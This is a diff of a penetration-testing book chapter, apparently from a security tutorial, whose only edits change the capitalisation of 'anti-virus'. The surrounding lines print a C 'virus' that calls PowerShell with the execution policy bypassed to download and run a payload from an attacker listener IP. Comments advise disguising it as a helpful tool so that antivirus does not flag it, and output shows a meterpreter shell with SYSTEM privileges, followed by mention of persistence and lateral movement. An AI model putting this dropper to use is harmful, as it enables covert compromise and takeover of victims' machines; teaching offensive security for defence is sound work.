@@ -334,7 +334,7 @@ G> Now let us create our binary virus, we will write this in c. I am going to ca
       // Set executionpolicy to bypass will enable script execution for this session, telling PS
       // to trust that you know what you are doing in downloading -> running scripts.
       // Invoke the EXpression: download the payload and execute it.
-      // Providing the payload does not trigger anti virus, this should not.
+      // Providing the payload does not trigger anti-virus, this should not.
       system("powershell.exe -noprofile -executionpolicy bypass \"IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))\"");
     
       // Add content here to make your target think this is a legitimate helpful tool.
@@ -345,7 +345,7 @@ G> Now let us create our binary virus, we will write this in c. I am going to ca
     }
 
 {icon=bomb}
-G> With this, neither the payload or the virus should trigger Anti-Virus.
+G> With this, neither the payload or the virus should trigger anti-virus.
 G>
 G> Now you will need a c compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, so you should be good to compile the virus.
 G>
@@ -426,7 +426,7 @@ G>
 G> `meterpreter > getuid`  
 G> `Server username: NT AUTHORITY\SYSTEM`
 G>
-G> No issue with Anti-Virus at all.  
+G> No issue with anti-virus at all.  
 G> That is the easy part done, now you would need to setup persistence, and start moving laterally through the network.
 
 {icon=bomb}
